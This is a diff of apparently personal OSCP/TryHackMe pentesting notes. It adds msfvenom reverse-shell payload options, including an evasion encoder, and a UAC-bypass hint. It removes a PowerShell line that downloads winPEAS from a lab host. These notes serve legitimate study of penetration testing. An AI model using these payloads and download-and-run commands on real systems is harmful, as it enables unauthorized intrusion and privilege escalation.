@@ -39,8 +39,11 @@ dos2unix file
   - python3 -c  import pty;pty.spawn('/bin/bash') 
   - export TERM=xterm
 
+
 ## Payloads
 - msfvenom - reverse -f aspx -o app.aspx
+- -e x86/shikata_ga_nai
+- windows/shell_reverse_tcp 
 
 ## Windows
 - /priv
@@ -59,6 +62,7 @@ dos2unix file
   - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows
 - Permissions:
   - icalcs
+- eventvwr
 
 ### Kerberos
 - Enumerate
@@ -97,4 +101,3 @@ docker exec 7b4294cce723 pandoc OSCP_Report_Steel_Mountail_THM.md \
   - docker system prune
 ```
 
-powershell -c Invoke-Webrequest -OutFile winPeas.bat http://10.9.1.255/winPEAS.ps1
